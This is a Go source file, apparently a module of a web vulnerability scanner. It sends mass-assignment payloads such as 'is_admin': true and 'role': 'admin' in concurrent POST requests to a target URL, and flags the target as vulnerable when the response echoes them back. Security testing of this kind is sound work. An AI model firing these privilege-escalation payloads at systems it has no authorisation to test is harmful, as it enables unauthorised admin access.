package core

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// MassAssignmentInjectionResult holds the result of the MassAssignmentInjection module execution.
type MassAssignmentInjectionResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// MassAssignmentInjection executes the mass_assignment_injection security technique.
type MassAssignmentInjection struct {
	BaseModule
	Target  string
	results []MassAssignmentInjectionResult
}

// NewMassAssignmentInjection creates a new instance.
func NewMassAssignmentInjection(target string) *MassAssignmentInjection {
	return &MassAssignmentInjection{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *MassAssignmentInjection) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var assignmentPayloads = []map[string]interface{}{
	{"is_admin": true},
	{"isAdmin": true},
	{"role": "admin"},
	{"permissions": "all"},
	{"user": map[string]interface{}{"is_admin": true}},
}

func (m *MassAssignmentInjection) Execute(ctx context.Context) ([]MassAssignmentInjectionResult, error) {
	m.results = make([]MassAssignmentInjectionResult, 0)

	jobs := make(chan map[string]interface{}, len(assignmentPayloads))
	for _, p := range assignmentPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *MassAssignmentInjection) testPayload(ctx context.Context, payload map[string]interface{}) {
	bodyBytes, _ := json.Marshal(payload)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := string(respBody)

	// In a real scenario, we might diff against a baseline request.
	// Here we check if the response echoes back our injected privileged field.
	payloadStr, _ := json.Marshal(payload)
	// Strip curlies for simple string search
	searchStr := strings.Trim(string(payloadStr), "{}")

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		if strings.Contains(strings.ToLower(respStr), strings.ToLower(searchStr)) {
			m.Mu.Lock()
			m.RecordPoC(req, nil, "Mass assignment potentially successful: API accepted and returned "+string(payloadStr))
			m.results = append(m.results, MassAssignmentInjectionResult{
				Target: m.Target,
				Status: "vulnerable",
				Detail: "Mass assignment potentially successful: API accepted and returned " + string(payloadStr),
			})
			m.Mu.Unlock()
		}
	}
}

func init() {
	RegisterModule("mass_assignment_injection", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting MassAssignmentInjection on: %s", target))

		tester := NewMassAssignmentInjection(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
